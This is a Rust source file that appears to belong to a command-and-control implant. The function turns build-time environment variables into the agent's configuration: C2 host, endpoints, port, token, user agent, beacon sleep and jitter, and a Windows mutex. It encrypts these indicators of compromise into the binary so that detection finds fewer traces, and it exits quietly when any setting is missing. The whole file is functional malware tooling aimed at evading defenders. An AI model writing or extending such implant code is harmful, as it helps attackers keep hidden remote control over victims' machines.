use std::process::exit;

#[cfg(debug_assertions)]
use shared::pretty_print::print_failed;
use str_crypter::{decrypt_string, sc};

pub type SleepSeconds = u64;
pub type ApiEndpoint = Vec<String>;
pub type SecurityToken = String;
pub type Useragent = String;
pub type Port = u16;
pub type URL = String;
pub type AgentNameByOperator = String;
pub type Jitter = u64;
pub type WinGlobalMutex = String;

/// Translates build artifacts passed to the compiler by the build environment variables
/// taken from the profile
pub fn translate_build_artifacts() -> (
    SleepSeconds,
    ApiEndpoint,
    SecurityToken,
    Useragent,
    Port,
    URL,
    AgentNameByOperator,
    Jitter,
    WinGlobalMutex,
) {
    // Note: This doesn't leave traces in the binary (other than unencrypted IOCs to be encrypted in a
    // upcoming small update). We use `option_env!()` to prevent rust-analyzer from having a fit - whilst
    // this could allow bad data, we prevent this at compile time with unwrap().
    let sleep_seconds: u64 = option_env!("DEF_SLEEP_TIME").unwrap().parse().unwrap();
    const URL: &str = option_env!("C2_HOST").unwrap_or_default();
    const API_ENDPOINT: &str = option_env!("C2_URIS").unwrap_or_default();
    const SECURITY_TOKEN: &str = option_env!("SECURITY_TOKEN").unwrap_or_default();
    const AGENT_NAME: &str = option_env!("AGENT_NAME").unwrap_or_default();
    const MUTEX: &str = option_env!("MUTEX").unwrap_or_default();
    const USERAGENT: &str = option_env!("USERAGENT").unwrap_or_default();
    let port: u16 = option_env!("C2_PORT").unwrap().parse().unwrap();
    let jitter: Jitter = option_env!("JITTER").unwrap().parse().unwrap();

    // to make the compiler comply, we have to construct the above including a default
    // value if the env var was not present, we want to check for those default values
    // and quit if they are present as that is considered a fatal error.
    if URL.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("URL was empty");

        exit(0);
    }

    if API_ENDPOINT.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("API_ENDPOINT was empty");

        exit(0);
    }

    if SECURITY_TOKEN.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("SECURITY_TOKEN was empty");

        exit(0);
    }

    if USERAGENT.is_empty() {
        #[cfg(debug_assertions)]
        print_failed("USERAGENT was empty");

        exit(0);
    }

    //
    // Encrypt the relevant IOCs into the binary
    //
    let url = sc!(URL, 41).unwrap();
    let useragent = sc!(USERAGENT, 49).unwrap();
    let agent_name_by_operator = sc!(AGENT_NAME, 128).unwrap();
    let security_token = sc!(SECURITY_TOKEN, 153).unwrap();
    let mutex = sc!(MUTEX, 142).unwrap();

    // The API endpoints are encoded as a csv; so we need to construct a Vec from that
    let api_endpoints = API_ENDPOINT
        .split(',')
        .map(|s| s.to_string())
        .collect::<Vec<String>>();

    (
        sleep_seconds,
        api_endpoints,
        security_token,
        useragent,
        port,
        url,
        agent_name_by_operator,
        jitter,
        mutex,
    )
}
